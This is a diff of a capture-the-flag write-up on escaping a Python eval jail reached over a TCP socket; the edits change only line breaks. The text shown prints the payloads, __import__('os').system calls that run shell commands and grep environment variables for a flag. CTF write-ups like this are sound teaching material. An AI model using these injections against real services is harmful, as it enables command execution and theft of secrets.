@@ -11,7 +11,7 @@ Description:
 
 ## TL;DR
 We have been given an Python eval jail over a TCP socket.  
-The solution is to retreive an environment variable using one  
+The solution is to retreive an environment variable using one 
 of the classic builtin hacks, for example:
 ```python
 __import__('os').system('env|grep -iE ".*f.*l.*a.*g"')
@@ -45,8 +45,8 @@ Let's check then if we can see some Python errors:
 TypeError: can't multiply sequence by non-int of type 'list'
 ```
 Bingo! If it really is an old ```eval``` jail, then
-we could escape using a~classic builtin hacks. Let's check
-that:
+we could escape using a~classic builtin hacks.  
+Let's check that:
 ```
 > str(__import__('os').system('echo x'))
 x
